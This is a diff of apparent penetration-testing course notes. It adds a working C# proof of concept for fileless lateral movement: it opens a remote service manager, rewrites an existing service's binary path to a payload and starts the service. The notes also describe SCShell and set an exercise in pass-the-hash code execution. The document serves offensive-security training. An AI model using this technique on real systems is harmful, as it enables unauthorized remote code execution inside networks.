@@ -351,45 +351,72 @@ its easy to pass the hash as well using this
 
 # implementing fileless later movement in C#
 
-```
+```C#
 using System;
 using System.Runtime.InteropServices;
+
 namespace lat
 {
- class Program
- {
- [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
-CharSet=CharSet.Unicode, SetLastError=true)]
- public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
-uint dwAccess);
- static void Main(string[] args)
- {
- String target = "appsrv01";
- 
- IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
- } 
- }
+    class Program
+    {
+        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+
+        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType,
+        int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup,
+        string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword,
+        string lpDisplayName);
+
+        [DllImport("advapi32", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
+
+
+        static void Main(string[] args)
+        {
+            String target = "winwork";
+            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+            string ServiceName = "SensorService";
+            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
+            string payload = "notepad.exe";
+            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null,
+            null, null, null, null);
+            bResult = StartService(schService, 0, null);
+
+        }
+    }
 }
 ```
 
-### using System;
-using System.Runtime.InteropServices;
-namespace lat
-{
- class Program
- {
- [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
-CharSet=CharSet.Unicode, SetLastError=true)]
- public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
-uint dwAccess);
- static void Main(string[] args)
- {
- String target = "appsrv01";
- 
- IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
- } 
- }
-}
+Run as administrator.
+
+before changing service
+
+![](./20220831102324.png)
+
+after changing service
+
+![](20220831102647.png)  
+
+SCShell,827 which has been implemented in C#, C, and Python, takes this a bit
+farther and weaponizes this technique. It also uses the QueryServiceConfig828
+API to detect the original service binary. After we have obtained code execution,
+SCShell will restore the service binary back to its original state to further aid
+evasion.
+
+### 13.2.2.1 Exercises
+1. Repeat the steps in this section to implement the proof of concept that executes Notepad on
+appsrv01.
+2. Use the Python implementation of SCShell (scshell.py) to get code execution on appsrv01
+directly from Kali using only the NTLM hash of the dave user.
+
+
 
 
 
